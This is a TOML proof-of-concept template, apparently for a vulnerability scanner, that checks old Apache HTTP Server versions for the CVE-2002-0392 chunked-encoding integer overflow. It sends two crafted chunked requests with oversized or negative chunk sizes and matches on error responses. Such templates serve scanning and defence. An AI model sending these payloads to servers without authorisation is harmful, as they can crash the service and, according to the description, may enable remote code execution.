[info]
author = "AVE"
description = "检测 Apache HTTP Server 1.3.x-1.3.24/2.0.x-2.0.36 分块编码整数溢出漏洞。通过发送特制的分块编码 HTTP 请求（包含超大或负数的块大小值），触发服务器在处理 Transfer-Encoding: chunked 时的整数溢出，导致拒绝服务或潜在远程代码执行。"
id = "POC-AVE-2002-0005"
name = "Apache HTTP Server Chunked Encoding 远程代码执行漏洞 PoC"
severity = "high"
tags = [
    "cve-2002-0392",
    "apache",
    "chunked-encoding",
    "integer-overflow",
]
vuln_id = [
    "CVE-2002-0392",
    "AVE-2002-0005",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
-1\r
\r
0\r
\r
"""
type = "raw"

[poc.requests.headers]
Connection = "close"
Transfer-Encoding = "chunked"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "connection was reset",
    "Connection reset by peer",
    "Bad Request",
]

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
    400,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
FFFFFFFF\r
\r
0\r
\r
"""
type = "raw"

[poc.requests.headers]
Connection = "close"
Transfer-Encoding = "chunked"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "connection was reset",
    "Connection reset by peer",
    "Bad Request",
]

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
    400,
]
type = "status"
